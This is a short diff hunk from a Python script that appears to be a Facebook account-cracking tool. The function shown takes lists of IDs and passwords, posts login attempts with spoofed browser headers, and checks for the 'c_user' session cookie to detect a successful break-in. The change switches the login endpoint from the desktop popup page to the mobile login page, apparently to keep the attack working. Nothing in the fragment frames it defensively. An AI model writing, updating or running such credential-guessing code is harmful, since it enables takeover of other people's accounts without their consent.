@@ -366,7 +366,7 @@ def _M1_(ids,pasx):
                         'referer': f'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',
                         'accept-encoding': 'gzip, deflate, br',
                         'accept-language': 'en-IE,en-US;q=0.9,en;q=0.8'}
-                        url=f"https://www.facebook.com/login.php/?login_attempt=1&display=popup"
+                        url=f"https://m.facebook.com/login.php/?login_attempt=1"
                         lo = session.post(url=url,data=info,headers=had).text
                         BLACK=session.cookies.get_dict().keys()
                         if 'c_user' in BLACK:
